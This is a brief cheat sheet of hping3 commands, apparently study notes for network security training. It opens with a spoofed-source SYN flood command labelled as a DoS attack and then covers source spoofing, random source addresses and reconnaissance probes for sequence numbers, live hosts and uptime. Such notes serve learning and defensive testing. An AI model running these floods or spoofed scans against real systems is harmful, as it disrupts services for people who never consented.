# SYN flooding a victim
hping3 -S 192.168.1.1 -a 192.168.1.254 -p 22 --flood

The attacker employs TCP SYN flooding techniques by using spoofed IP addresses to perform a DoS attack.

# Determine the number of pings
hping3 -c 3 10.10.10.10

Here, -c 3 means that we only want to send three packets to the target machine

# Use a random source address
--rand-source

# Set data size
Set data packet size in bytes --data <size>

# Spoof source address
hping3 -S <IP address attacked> -a <spoofed IP address>

or

hping3 -S <IP address attacked> --spoof <spoofed IP address>

# Examples
hping3 <Target IP> -Q -p 139 -s
By using the argument -Q in the command line, Hping collects all the TCP sequence numbers generated by the target host.
hping3 –A <Target IP> –p 80
By issuing this command, Hping checks if a host is alive on a network. If it finds a live host and an open port, it returns an RST response.
hping3 -S <Target IP> -p 80 --tcp-timestamp
By adding the –TCP-timestamp argument in the command line, Hping enables the TCP timestamp option and tries to guess the timestamp update frequency and uptime of the target host.
